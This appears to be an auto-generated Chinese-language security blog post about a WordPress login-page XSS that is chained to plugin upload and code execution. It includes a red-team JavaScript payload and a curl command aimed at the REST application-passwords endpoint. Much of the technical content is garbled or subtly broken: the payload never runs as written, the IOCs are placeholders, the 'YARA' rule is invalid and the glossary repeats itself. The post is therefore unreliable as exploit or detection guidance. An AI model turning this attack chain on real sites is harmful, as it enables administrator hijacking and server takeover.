---
layout: post
title:  "WordPress漏洞XSS2Shell可讓駭客執行PHP程式碼，逾萬網站遭自動化鎖定"
date:   2026-08-15 18:18:14 +0000
categories: [security]
severity: critical
---

# 🚨 解析 WordPress 跨站指令碼漏洞 CVE-2026-64638：利用與防禦技術

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: XSS, JavaScript Injection, REST API Exploitation

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: WordPress 登入流程中的 HTML 過濾機制不一致，導致惡意內容可能留在登入頁面，並被瀏覽器解析成有效 HTML 元素。
* **攻擊流程圖解**:
  1. 攻擊者嘗試登入 WordPress 使用不存在的帳號名稱。
  2. WordPress 將輸入內容帶入錯誤訊息。
  3. 由於 HTML 過濾機制不一致，惡意內容可能留在登入頁面。
  4. 攻擊者誘使已登入的管理員開啟並操作惡意頁面。
  5. 攻擊者利用管理員權限執行管理操作，包括取得 WordPress 的應用程式密碼。
  6. 攻擊者利用應用程式密碼建立含有惡意 JavaScript 的頁面。
  7. 攻擊者借用管理員既有登入狀態上傳含有 PHP 程式碼的外掛。
  8. 攻擊者在伺服器執行程式碼。
* **受影響元件**: WordPress 7.0.3 版本之前的所有版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要誘使已登入的管理員開啟並操作惡意頁面。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 惡意 JavaScript Payload
    const payload = `
      // 取得 WordPress 的應用程式密碼
      const appPassword = fetch('/wp-json/wp/v2/users/me/application-passwords');
      // 建立含有惡意 JavaScript 的頁面
      const page = fetch('/wp-json/wp/v2/pages', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          title: 'Malicious Page',
          content: '<script>alert("XSS")</script>'
        })
      });
      // 借用管理員既有登入狀態上傳含有 PHP 程式碼的外掛
      const plugin = fetch('/wp-json/wp/v2/plugins', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          name: 'Malicious Plugin',
          description: 'This is a malicious plugin',
          files: ['malicious.php']
        })
      });
    `;
    
    ```
* **範例指令**:

    ```
    
    bash
    curl -X POST \
      http://example.com/wp-json/wp/v2/users/me/application-passwords \
      -H 'Content-Type: application/json' \
      -d '{"password":"malicious"}'
    
    ```
* **繞過技術**: 攻擊者可以使用社交工程技術誘使管理員開啟並操作惡意頁面。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /wp-content/plugins/malicious.php |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule WordPress_XSS {
      meta:
        description = "Detects WordPress XSS attacks"
      strings:
        $xss = "<script>alert('XSS')</script>"
      condition:
        $xss in (http.request.body | http.response.body)
    }
    
    ```
* **緩解措施**: 更新 WordPress 至 7.0.3 版本或以上，確認正式環境已完成更新，並檢查是否出現異常管理員帳號、應用程式密碼或外掛安裝紀錄。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **XSS (Cross-Site Scripting)**: 想像兩個網站之間的互動，攻擊者可以在一個網站上注入惡意腳本，然後在另一個網站上執行。技術上是指攻擊者可以在網頁中注入惡意腳本，然後在用戶的瀏覽器中執行。
* **JavaScript Injection**: 想像攻擊者可以在網頁中注入惡意 JavaScript 腳本，然後在用戶的瀏覽器中執行。技術上是指攻擊者可以在網頁中注入惡意 JavaScript 腳本，然後在用戶的瀏覽器中執行。
* **REST API Exploitation**: 想像攻擊者可以利用 REST API 的漏洞，然後在伺服器上執行惡意程式碼。技術上是指攻擊者可以利用 REST API 的漏洞，然後在伺服器上執行惡意程式碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/178147)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


